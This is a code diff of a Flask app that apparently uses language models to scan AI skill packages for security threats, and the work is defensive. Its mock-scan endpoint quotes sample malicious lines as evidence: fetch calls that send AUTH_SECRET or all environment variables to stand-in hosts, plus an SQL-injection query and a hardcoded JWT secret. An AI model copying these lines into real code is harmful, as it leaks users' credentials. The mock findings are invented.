@@ -14,27 +14,91 @@ from flask import Flask, request, jsonify, send_from_directory, render_template
 
 from scanner import scan
 
+BASE_DIR = Path(__file__).parent.absolute()
+SCANS_FILE = BASE_DIR / "scans.json"
+SCANS = {}
+
 app = Flask(__name__)
 
+ENV_API_KEY_VARS = {
+    "anthropic": "ANTHROPIC_API_KEY",
+    "openai": "OPENAI_API_KEY",
+    "openrouter": "OPENROUTER_API_KEY",
+    "gemini": "GEMINI_API_KEY",
+}
+
+def _load_dotenv() -> None:
+    env_path = BASE_DIR / ".env"
+    if not env_path.exists():
+        return
+    try:
+        for line in env_path.read_text(encoding="utf-8").splitlines():
+            line = line.strip()
+            if not line or line.startswith("#") or "=" not in line:
+                continue
+            k, v = line.split("=", 1)
+            k = k.strip()
+            v = v.strip().strip('"').strip("'")
+            if k and k not in os.environ:
+                os.environ[k] = v
+    except Exception:
+        return
+
+def _redact_secret(value: str) -> str:
+    if not value:
+        return value
+    return f"[REDACTED...{value[-4:]}]"
+
+def _redact_headers(headers: dict) -> dict:
+    redacted = {}
+    for k, v in (headers or {}).items():
+        key = str(k)
+        low = key.lower()
+        if low in ("authorization", "x-api-key"):
+            redacted[key] = _redact_secret(str(v))
+        else:
+            redacted[key] = v
+    return redacted
+
+def _resolve_provider_name(conf: dict) -> str:
+    raw = conf.get("provider", "anthropic")
+    return str(raw).strip().lower()
+
+def _resolve_api_key(provider_name: str, provider_conf: dict) -> str:
+    api_key = ""
+    if isinstance(provider_conf, dict):
+        api_key = str(provider_conf.get("api_key", "") or "").strip()
+
+    if api_key and "YOUR_" not in api_key:
+        return api_key
+
+    env_var = ENV_API_KEY_VARS.get(provider_name)
+    if env_var:
+        env_val = str(os.getenv(env_var, "") or "").strip()
+        if env_val:
+            return env_val
+
+    return api_key
+
 def load_config():
-    config_path = Path('config.json')
+    config_path = BASE_DIR / 'config.json'
     if config_path.exists():
         with open(config_path, 'r', encoding='utf-8') as f:
             return json.load(f)
+    print(f"Warning: No config.json found at {config_path}")
     return {}
 
 def load_scans():
-    scans_path = Path('scans.json')
-    if scans_path.exists():
+    if SCANS_FILE.exists():
         try:
-            with open(scans_path, 'r', encoding='utf-8') as f:
+            with open(SCANS_FILE, 'r', encoding='utf-8') as f:
                 return json.load(f)
         except Exception:
             return {}
     return {}
 
 def save_scans():
-    with open('scans.json', 'w', encoding='utf-8') as f:
+    with open(SCANS_FILE, 'w', encoding='utf-8') as f:
         json.dump(SCANS, f, indent=2)
 
 SCANS = load_scans()
@@ -91,7 +155,9 @@ PROVIDERS = {
         "url": "https://openrouter.ai/api/v1/chat/completions",
         "headers": lambda cfg: {
             "Authorization": f"Bearer {cfg.get('api_key', '')}",
-            "Content-Type": "application/json"
+            "Content-Type": "application/json",
+            "HTTP-Referer": "https://github.com/patidarganesh/SkillScanner",
+            "X-Title": "SkillScanner"
         },
         "body": lambda model, system, user: {
             "model": model,
@@ -99,7 +165,7 @@ PROVIDERS = {
                 {"role": "system", "content": system},
                 {"role": "user", "content": user}
             ],
-            "response_format": {"type": {"type": "json_object"}}
+            "response_format": {"type": "json_object"}
         },
         "extract": lambda data: data["choices"][0]["message"]["content"]
     },
@@ -130,41 +196,69 @@ def clean_json(raw: str) -> str:
     return raw
 
 def call_ai(payload: str) -> dict:
+    _load_dotenv()
     conf = load_config()
-    provider_name = conf.get("provider", "anthropic")
+    provider_name = _resolve_provider_name(conf)
     p_conf = conf.get(provider_name, {})
-    model = p_conf.get("model", "claude-opus-4-6")
-    
+    model = p_conf.get("model", "claude-3-5-sonnet-latest")
+
     provider = PROVIDERS.get(provider_name)
     if not provider:
         raise Exception(f"Unknown provider: {provider_name}")
-        
-    url = provider["url"](p_conf) if callable(provider["url"]) else provider["url"]
-    headers = provider["headers"](p_conf)
-    if "User-Agent" not in headers:
-        headers["User-Agent"] = "SkillScanner/1.0 (Mozilla/5.0)"
-    
+
+    api_key = _resolve_api_key(provider_name, p_conf)
+    if provider_name != "ollama":
+        if not api_key or "YOUR_" in api_key:
+            env_hint = ENV_API_KEY_VARS.get(provider_name)
+            hint = f" Set {env_hint} or put the key in config.json." if env_hint else " Put the key in config.json."
+            raise Exception(f"API key for {provider_name} is missing or not configured.{hint}")
+
+    effective_conf = dict(p_conf) if isinstance(p_conf, dict) else {}
+    if api_key:
+        effective_conf["api_key"] = api_key
+
+    url = provider["url"](effective_conf) if callable(provider["url"]) else provider["url"]
+    headers_dict = provider["headers"](effective_conf)
+
     try:
-        with open('prompt.md', 'r', encoding='utf-8') as f:
+        with open(BASE_DIR / "prompt.md", "r", encoding="utf-8") as f:
             system_prompt = f.read()
     except Exception:
         system_prompt = "Return raw JSON only."
-        
+
     body_data = provider["body"](model, system_prompt, payload)
-    data = json.dumps(body_data).encode('utf-8')
-    
-    req = urllib.request.Request(url, data=data, headers=headers, method='POST')
+    data = json.dumps(body_data).encode("utf-8")
+
+    req = urllib.request.Request(url, data=data, method="POST")
+
+    for key, value in headers_dict.items():
+        req.add_header(key, value)
+
+    if "User-Agent" not in headers_dict:
+        req.add_header("User-Agent", "SkillScanner/1.0 (Mozilla/5.0)")
+
+    if str(os.getenv("SKILLSCAN_DEBUG_HTTP", "") or "").strip() == "1":
+        print("--- DEBUG OUTGOING REQUEST ---")
+        print("URL:", req.full_url)
+        print("HEADERS:", _redact_headers(dict(req.headers)))
+        print("------------------------------")
+
     try:
         with urllib.request.urlopen(req, timeout=180) as response:
-            resp_body = response.read().decode('utf-8')
+            resp_body = response.read().decode("utf-8")
             resp_data = json.loads(resp_body)
             raw_text = provider["extract"](resp_data)
-            
+
             clean_text = clean_json(raw_text)
             return json.loads(clean_text)
     except urllib.error.HTTPError as e:
-        error_body = e.read().decode('utf-8')
-        raise Exception(f"HTTPError {e.code}: {error_body}")
+        error_body = e.read().decode("utf-8")
+        try:
+            err_json = json.loads(error_body)
+            error_msg = err_json.get("error", {}).get("message", error_body)
+            raise Exception(f"HTTPError {e.code}: {error_msg}")
+        except Exception:
+            raise Exception(f"HTTPError {e.code}: {error_body}")
     except Exception as e:
         raise Exception(f"AI API Error: {str(e)}")
 
@@ -175,22 +269,37 @@ def build_payload(scan_res: dict) -> str:
     parts.append(f"Package: {scan_res.get('name', 'Unknown')}")
     parts.append(f"Input type: {scan_res.get('input_type', 'unknown')}")
     parts.append(f"Total readable files: {scan_res.get('readable_files', 0)}")
-    parts.append(f"Skipped (binary/unreadable): {scan_res.get('skipped_files', 0)}")
+    parts.append(f"Skipped files: {scan_res.get('skipped_files', 0)}")
     parts.append("\nFILE STRUCTURE:")
     parts.append(scan_res.get('file_tree', ''))
     
     skipped = scan_res.get('skipped', [])
     if skipped:
-        parts.append("\nSKIPPED FILES (not sent — binary or unreadable):")
+        parts.append("\nSKIPPED FILES (unreadable / skipped types):")
         for s in skipped:
             parts.append(f"- {s.get('relative_path')} ({s.get('reason')})")
+
+    static_findings = scan_res.get('static_findings', [])
+    if static_findings:
+        parts.append("\n===============================")
+        parts.append("STATIC SECURITY CHECKS & EVASION ALERTS:")
+        parts.append("===============================")
+        for sf in static_findings:
+            parts.append(f"[{sf.get('severity', 'info').upper()}] {sf.get('title')}: {sf.get('description')} (Location: {sf.get('location')})")
+
+    cross_refs = scan_res.get('cross_references', [])
+    if cross_refs:
+        parts.append("\nDETECTED CROSS-REFERENCES TO SKIPPED PATHS OR FILES:")
+        for cr in cross_refs:
+            parts.append(f"- {cr.get('source')} -> {cr.get('target')} (Type: {cr.get('type')})")
             
     parts.append("\n===============================")
-    parts.append("FILE CONTENTS:")
+    parts.append("FILE CONTENTS & EXTRACTED LOGIC:")
     parts.append("===============================\n")
     
     for f in scan_res.get('files', []):
-        parts.append(f"--- FILE: {f.get('relative_path')} ({f.get('size_bytes')} bytes) ---")
+        note = f" [{f.get('special_note')}]" if f.get('special_note') else ""
+        parts.append(f"--- FILE: {f.get('relative_path')} ({f.get('size_bytes')} bytes){note} ---")
         parts.append(f.get('content', ''))
         parts.append("\n")
         
@@ -215,6 +324,45 @@ def run_analysis_task(scan_id, path=None, is_folder=False, extract_dir=None, fil
             
         payload = build_payload(scan_res)
         ai_res = call_ai(payload)
+
+        # Merge static findings into ai_res so no bypass or evasion goes unnoticed
+        static_findings = scan_res.get("static_findings", [])
+        if static_findings:
+            if "threat_findings" not in ai_res or not isinstance(ai_res["threat_findings"], list):
+                ai_res["threat_findings"] = []
+
+            existing_titles = {str(f.get("title", "")).lower() for f in ai_res["threat_findings"]}
+            for sf in static_findings:
+                if str(sf.get("title", "")).lower() not in existing_titles:
+                    ai_res["threat_findings"].append(sf)
+
+            severities = [str(f.get("severity", "")).lower() for f in ai_res["threat_findings"]]
+            has_critical = "critical" in severities
+            has_high = "high" in severities
+
+            if has_critical:
+                ai_res["threat_level"] = "CRITICAL"
+                ai_res["verdict"] = "Malicious"
+                ai_res["safe_to_use"] = False
+                if ai_res.get("overall_score", 100) > 25:
+                    ai_res["overall_score"] = 15
+            elif has_high:
+                if ai_res.get("threat_level") in ("SAFE", "LOW", "MEDIUM", None):
+                    ai_res["threat_level"] = "HIGH"
+                if ai_res.get("verdict") in ("Clean", "Trusted", None):
+                    ai_res["verdict"] = "Suspicious"
+                ai_res["safe_to_use"] = False
+                if ai_res.get("overall_score", 100) > 45:
+                    ai_res["overall_score"] = 40
+
+            stats = ai_res.get("stats", {})
+            stats["critical"] = severities.count("critical")
+            stats["high"] = severities.count("high")
+            stats["medium"] = severities.count("medium")
+            stats["low"] = severities.count("low")
+            stats["info"] = severities.count("info")
+            stats["total_threats"] = len(ai_res["threat_findings"])
+            ai_res["stats"] = stats
         
         for f in scan_res.get('files', []):
             if 'content' in f:
@@ -232,7 +380,7 @@ def run_analysis_task(scan_id, path=None, is_folder=False, extract_dir=None, fil
         if extract_dir:
             try:
                 shutil.rmtree(extract_dir)
-            except:
+            except Exception:
                 pass
 
 @app.route('/')
@@ -333,7 +481,7 @@ def analyse_zip():
             
         scan_id = str(uuid.uuid4())
         SCANS[scan_id] = {
-            "status": "pending",
+            "status": "pending", 
             "timestamp": time.time(),
             "name": file.filename
         }
@@ -344,178 +492,228 @@ def analyse_zip():
         shutil.rmtree(temp_dir, ignore_errors=True)
         return jsonify({"success": False, "error": str(e)}), 500
 
-@app.route('/analyse-folder-upload', methods=['POST'])
-def analyse_folder_upload():
-    if 'files' not in request.files:
+@app.route('/analyse-folder', methods=['POST'])
+def analyse_folder():
+    files = request.files.getlist('files')
+    paths = request.form.getlist('paths')
+    
+    if not files or len(files) == 0:
         return jsonify({"success": False, "error": "No files uploaded"}), 400
         
-    files = request.files.getlist('files')
-    if not files or files[0].filename == '':
-        return jsonify({"success": False, "error": "No files selected"}), 400
-        
     temp_dir = tempfile.mkdtemp()
-    extract_dir = os.path.join(temp_dir, "uploaded_folder")
+    extract_dir = os.path.join(temp_dir, "folder")
     os.makedirs(extract_dir, exist_ok=True)
     
+    root_folder_name = "Uploaded Folder"
+    if paths and len(paths) > 0:
+        first_path = paths[0].replace('\\', '/')
+        if '/' in first_path:
+            root_folder_name = first_path.split('/')[0]
+
     try:
-        folder_name = "Upload"
-        for file in files:
-            if file.filename:
-                path_parts = file.filename.split('/')
-                if len(path_parts) > 1:
-                    folder_name = path_parts[0]
+        for file, rel_path in zip(files, paths):
+            if not rel_path:
+                rel_path = file.filename
                 
-                safe_path = os.path.join(extract_dir, file.filename)
-                os.makedirs(os.path.dirname(safe_path), exist_ok=True)
-                file.save(safe_path)
-                
+            clean_rel = os.path.normpath(rel_path).lstrip(os.sep)
+            target_file_path = os.path.join(extract_dir, clean_rel)
+            os.makedirs(os.path.dirname(target_file_path), exist_ok=True)
+            file.save(target_file_path)
+            
         scan_id = str(uuid.uuid4())
         SCANS[scan_id] = {
-            "status": "pending",
+            "status": "pending", 
             "timestamp": time.time(),
-            "name": folder_name
+            "name": root_folder_name
         }
         save_scans()
-        threading.Thread(target=run_analysis_task, args=(scan_id, None, True, extract_dir, folder_name)).start()
+        threading.Thread(target=run_analysis_task, args=(scan_id, None, True, extract_dir, root_folder_name)).start()
         return jsonify({"success": True, "scan_id": scan_id})
     except Exception as e:
         shutil.rmtree(temp_dir, ignore_errors=True)
         return jsonify({"success": False, "error": str(e)}), 500
 
-@app.route('/api/dummy', methods=['POST'])
+@app.route('/api/dummy-scan', methods=['POST'])
 def dummy_scan():
     scan_id = str(uuid.uuid4())
     SCANS[scan_id] = {
-        "status": "pending",
+        "status": "completed",
         "timestamp": time.time(),
-        "name": "Local Dummy Test"
+        "name": "test-auth-package"
+    }
+    SCANS[scan_id]["scan_summary"] = {
+        "name": "test-auth-package",
+        "input_type": "folder",
+        "readable_files": 8,
+        "skipped_files": 2,
+        "file_tree": "test-auth-package/\n├── SKILL.md\n├── _meta.json\n└── src/\n    ├── api.js\n    └── utils.js"
+    }
+    SCANS[scan_id]["result"] = {
+        "package_name": "test-auth-package",
+        "package_purpose": "Authentication utility for AI agents",
+        "threat_level": "CRITICAL",
+        "overall_score": 18,
+        "verdict": "Malicious",
+        "summary": "This package claims to be an auth utility but contains active credential exfiltration and an unauthorized outbound network connection. DO NOT USE.",
+        "safe_to_use": False,
+        "threat_findings": [
+            {
+                "id": 1,
+                "category": "data_exfiltration",
+                "severity": "critical",
+                "title": "Credential Exfiltration via Webhook",
+                "description": "The file src/api.js reads process.env.AUTH_SECRET and sends it to an external unverified endpoint.",
+                "evidence": "fetch('https://evil-analytics.xyz/collect', { method: 'POST', body: process.env.AUTH_SECRET })",
+                "location": "src/api.js:42",
+                "recommendation": "Immediately remove src/api.js and revoke any exposed secrets."
+            }
+        ],
+        "network_analysis": {
+            "outbound_connections": [
+                {
+                    "url": "https://evil-analytics.xyz/collect",
+                    "file": "src/api.js",
+                    "purpose": "Credential exfiltration",
+                    "risk": "dangerous"
+                }
+            ],
+            "data_sent_externally": "Environment variables including AUTH_SECRET sent via POST"
+        },
+        "file_risk_assessment": [
+            {
+                "path": "SKILL.md",
+                "role": "Skill definition and instructions",
+                "risk_level": "safe",
+                "threats_found": 0,
+                "one_line": "Standard documentation with no malicious instructions"
+            },
+            {
+                "path": "src/api.js",
+                "role": "Network and auth logic",
+                "risk_level": "dangerous",
+                "threats_found": 1,
+                "one_line": "Contains active credential harvesting and external exfiltration"
+            }
+        ],
+        "permissions_analysis": {
+            "file_system_access": [],
+            "network_access": ["evil-analytics.xyz"],
+            "shell_execution": [],
+            "environment_access": ["AUTH_SECRET"],
+            "excessive_permissions": True,
+            "justification": "A local auth utility has no legitimate need to beacon environment variables to an external server."
+        },
+        "security_positives": [
+            "Includes clean SKILL.md documentation format",
+            "Uses parameterized inputs in utility helpers"
+        ],
+        "remediation_priority": [
+            {
+                "step": 1,
+                "action": "Remove the malicious exfiltration call to evil-analytics.xyz",
+                "severity": "critical",
+                "effort": "low",
+                "why": "Stops ongoing data theft immediately"
+            }
+        ],
+        "stats": {
+            "files_scanned": 8,
+            "total_threats": 1,
+            "critical": 1,
+            "high": 0,
+            "medium": 0,
+            "low": 0,
+            "info": 0,
+            "safe_files": 7,
+            "risky_files": 1
+        }
     }
     save_scans()
-    
-    def set_dummy():
-        time.sleep(3)
-        SCANS[scan_id]["status"] = "completed"
-        SCANS[scan_id]["scan_summary"] = {
-            "name": "test-auth-package",
-            "input_type": "folder",
-            "readable_files": 8,
-            "skipped_files": 2,
-            "file_tree": "test-auth-package/\n├── SKILL.md\n├── _meta.json\n└── src/\n    ├── api.js\n    └── utils.js"
-        }
-        SCANS[scan_id]["result"] = {
-            "package_name": "test-auth-package",
-            "package_purpose": "A skill package claiming to handle user authentication and profile management.",
-            "threat_level": "HIGH",
-            "overall_score": 32,
-            "verdict": "Suspicious",
-            "summary": "This package contains multiple high-severity security threats. A hidden fetch call in utils.js sends harvested environment variables to an unknown external server. The SQL injection vulnerability could allow attackers to dump the entire database. Do NOT use in production without fixing all critical issues.",
-            "safe_to_use": False,
-            "threat_findings": [
-                { "id": 1, "category": "data_exfiltration", "severity": "critical", "title": "Env vars sent to external server", "description": "utils.js contains a hidden fetch() call on line 47 that collects all process.env variables and POSTs them to https://collect.shady-analytics.io/harvest. This is data exfiltration of API keys and secrets.", "evidence": "fetch('https://collect.shady-analytics.io/harvest', {method:'POST', body: JSON.stringify(process.env)})", "location": "src/utils.js:47", "recommendation": "Remove this fetch call immediately. Audit what data may have already been exfiltrated." },
-                { "id": 2, "category": "credential_theft", "severity": "critical", "title": "Hardcoded JWT with env harvest", "description": "The JWT secret is hardcoded as 'super_secret_key_123' which is trivially guessable. Combined with the env exfiltration, attackers could forge tokens.", "evidence": "const JWT_SECRET = 'super_secret_key_123'", "location": "src/utils.js:12", "recommendation": "Move JWT secret to environment variable. Use cryptographically random secret of at least 256 bits." },
-                { "id": 3, "category": "suspicious_behavior", "severity": "high", "title": "SQL Injection in login endpoint", "description": "The login endpoint directly interpolates user input into SQL queries without parameterization, allowing attackers to bypass authentication or dump the database.", "evidence": "db.query(`SELECT * FROM users WHERE email='${req.body.email}'`)", "location": "src/api.js:23", "recommendation": "Use parameterized queries with prepared statements." },
-                { "id": 4, "category": "insecure_communication", "severity": "medium", "title": "HTTP used instead of HTTPS", "description": "Internal API calls use HTTP protocol which can be intercepted via MITM attacks.", "evidence": "fetch('http://internal-api.example.com/data')", "location": "src/api.js:45", "recommendation": "Switch all internal API calls to HTTPS." }
-            ],
-            "network_analysis": {
-                "outbound_connections": [
-                    { "url": "https://collect.shady-analytics.io/harvest", "file": "src/utils.js", "purpose": "Exfiltrates all environment variables including API keys", "risk": "dangerous" },
-                    { "url": "http://internal-api.example.com/data", "file": "src/api.js", "purpose": "Internal data fetch over insecure HTTP", "risk": "suspicious" }
-                ],
-                "data_sent_externally": "All process.env variables including API keys, database credentials, and JWT secrets are sent to an external server."
-            },
-            "file_risk_assessment": [
-                { "path": "SKILL.md", "role": "Documentation", "risk_level": "safe", "threats_found": 0, "one_line": "Clean documentation file, no executable code." },
-                { "path": "_meta.json", "role": "Metadata", "risk_level": "safe", "threats_found": 0, "one_line": "Standard metadata, no threats." },
-                { "path": "src/api.js", "role": "API endpoints", "risk_level": "high_risk", "threats_found": 2, "one_line": "SQL injection and insecure HTTP connections detected." },
-                { "path": "src/utils.js", "role": "Utility functions", "risk_level": "dangerous", "threats_found": 2, "one_line": "ACTIVE DATA EXFILTRATION and hardcoded credentials." }
-            ],
-            "permissions_analysis": {
-                "file_system_access": [".env", "config.json"],
-                "network_access": ["collect.shady-analytics.io", "internal-api.example.com"],
-                "shell_execution": [],
-                "environment_access": ["process.env (ALL variables)"],
-                "excessive_permissions": True,
-                "justification": "An auth package has no legitimate reason to harvest ALL environment variables and send them to an external analytics server."
-            },
-            "security_positives": [
-                "SKILL.md documentation is clean and contains no executable code.",
-                "File structure is logically organized."
-            ],
-            "remediation_priority": [
-                { "step": 1, "action": "Remove data exfiltration fetch call in utils.js:47", "severity": "critical", "effort": "low", "why": "Active exfiltration of all env vars to unknown server." },
-                { "step": 2, "action": "Replace hardcoded JWT secret with secure env variable", "severity": "critical", "effort": "low", "why": "Trivially guessable secret enables token forgery." },
-                { "step": 3, "action": "Fix SQL injection in login endpoint", "severity": "high", "effort": "low", "why": "Allows full database compromise." },
-                { "step": 4, "action": "Switch all HTTP calls to HTTPS", "severity": "medium", "effort": "low", "why": "Prevents man-in-the-middle attacks." }
-            ],
-            "stats": {
-                "files_scanned": 4,
-                "total_threats": 4,
-                "critical": 2,
-                "high": 1,
-                "medium": 1,
-                "low": 0,
-                "info": 0,
-                "safe_files": 2,
-                "risky_files": 2
-            }
-        }
-        save_scans()
-        
-    threading.Thread(target=set_dummy).start()
     return jsonify({"success": True, "scan_id": scan_id})
-@app.route('/api/ollama-models')
-def detect_ollama_models():
-    """Auto-detect locally installed Ollama models by querying the Ollama API."""
-    try:
-        req = urllib.request.Request('http://localhost:11434/api/tags')
-        req.add_header('Content-Type', 'application/json')
-        with urllib.request.urlopen(req, timeout=3) as resp:
-            data = json.loads(resp.read().decode())
-            models = [m['name'] for m in data.get('models', []) if 'name' in m]
-            if models:
-                return jsonify({"success": True, "models": models})
-            return jsonify({"success": False, "models": [], "error": "No models found"})
-    except Exception as e:
-        return jsonify({"success": False, "models": [], "error": f"Ollama not reachable: {str(e)}"})
 
-@app.route('/config', methods=['GET', 'POST'])
+@app.route('/api/config', methods=['GET', 'POST'])
 def handle_config():
-    conf = load_config()
     if request.method == 'POST':
         data = request.json
-        if not data:
-            return jsonify({"success": False, "error": "No data provided"}), 400
-        
         provider = data.get("provider")
+        api_key = data.get("api_key")
         model = data.get("model")
         
-        if provider and provider in PROVIDERS:
+        conf = load_config()
+        if provider in ["anthropic", "openai", "openrouter", "ollama", "gemini"]:
             conf["provider"] = provider
+            if api_key:
+                if provider not in conf:
+                    conf[provider] = {}
+                elif not isinstance(conf[provider], dict):
+                    conf[provider] = {}
+                conf[provider]["api_key"] = api_key
             if model:
                 if provider not in conf:
                     conf[provider] = {}
+                elif not isinstance(conf[provider], dict):
+                    conf[provider] = {}
                 conf[provider]["model"] = model
             
-            with open('config.json', 'w', encoding='utf-8') as f:
+            with open(BASE_DIR / 'config.json', 'w', encoding='utf-8') as f:
                 json.dump(conf, f, indent=2)
             return jsonify({"success": True})
         return jsonify({"success": False, "error": "Invalid provider"}), 400
-
-    provider = conf.get("provider", "anthropic")
-    model = conf.get(provider, {}).get("model", "unknown")
+        
+    conf = load_config()
+    curr_provider = conf.get("provider", "anthropic")
     
     # Return available options for UI dropdowns
     options = {
-        "anthropic": ["claude-opus-4-6", "claude-sonnet-4-20250514", "claude-3-5-sonnet-20240620", "claude-3-opus-20240229", "claude-3-haiku-20240307"],
-        "openai": ["gpt-4o", "gpt-4o-mini", "gpt-4-turbo", "gpt-4", "gpt-3.5-turbo", "o1-preview", "o1-mini"],
-        "ollama": ["llama3.2", "llama3.1", "llama3", "mistral", "mixtral", "gemma2", "gemma", "qwen2.5", "phi3", "phi3:medium", "deepseek-coder", "codellama", "command-r", "nous-hermes2"],
-        "openrouter": ["anthropic/claude-3.5-sonnet", "anthropic/claude-3-opus", "openai/gpt-4o", "google/gemini-pro-1.5", "meta-llama/llama-3-70b", "mistralai/mixtral-8x22b"],
-        "gemini": ["gemini-2.5-pro", "gemini-2.5-flash", "gemini-2.0-pro-exp-02-05", "gemini-2.0-flash", "gemini-1.5-pro", "gemini-1.5-flash"]
+        "anthropic": [
+            "claude-3-7-sonnet", 
+            "claude-3-5-sonnet-latest", 
+            "claude-3-5-haiku-latest", 
+            "claude-3-opus-latest",
+            "claude-3-5-sonnet-20241022",
+            "claude-3-opus-20240229", 
+            "claude-3-haiku-20240307"
+        ],
+        "openai": [
+            "gpt-4o", 
+            "gpt-4o-mini", 
+            "o1", 
+            "o1-mini", 
+            "o3-mini", 
+            "gpt-4.5", 
+            "gpt-4-turbo", 
+            "gpt-4", 
+            "gpt-3.5-turbo"
+        ],
+        "ollama": [
+            "llama3.2", "llama3.1", "llama3", "mistral", "mixtral", "gemma2", "gemma", "qwen2.5", 
+            "phi3", "phi4", "deepseek-v3", "deepseek-coder", "command-r", "codellama"
+        ],
+        "openrouter": [
+            "google/gemini-2.0-flash-001",
+            "anthropic/claude-3.5-sonnet", 
+            "openai/gpt-4o", 
+            "openai/gpt-4o-mini",
+            "google/gemini-pro-1.5", 
+            "meta-llama/llama-3.1-405b", 
+            "meta-llama/llama-3.1-70b", 
+            "mistralai/mistral-large-2407",
+            "deepseek/deepseek-chat"
+        ],
+        "gemini": [
+            "gemini-2.0-flash", 
+            "gemini-2.0-flash-thinking-exp", 
+            "gemini-2.0-pro-exp-02-05", 
+            "gemini-1.5-pro", 
+            "gemini-1.5-flash", 
+            "gemini-1.5-flash-8b"
+        ]
     }
     
     return jsonify({
-        "provider": provider, 
-        "model": model,
+        "current_provider": curr_provider,
+        "current_model": conf.get(curr_provider, {}).get("model", ""),
+        "has_key": bool(conf.get(curr_provider, {}).get("api_key") and "YOUR_" not in conf.get(curr_provider, {}).get("api_key", "")),
         "options": options
     })
 
@@ -536,14 +734,13 @@ if __name__ == '__main__':
     port = server_conf.get("port", 5000)
     
     url = f"http://{host}:{port}"
-    print("╔══════════════════════════════════╗")
-    print("║  SkillScan 🔍  v3.0              ║")
-    print("║  AI Skill Package Analyser       ║")
-    print("╠══════════════════════════════════╣")
-    print(f"║  Provider : {provider.ljust(21)}║")
-    print(f"║  Model    : {model.ljust(21)}║")
-    print(f"║  URL      : {url.ljust(21)}║")
-    print("╚══════════════════════════════════╝")
+    print("====================================")
+    print("  SkillScan - AI Package Security   ")
+    print("====================================")
+    print(f"  Provider : {provider}")
+    print(f"  Model    : {model}")
+    print(f"  URL      : {url}")
+    print("====================================")
     
     threading.Thread(target=open_browser, daemon=True).start()
     app.run(host=host, port=port, debug=False, use_reloader=False)
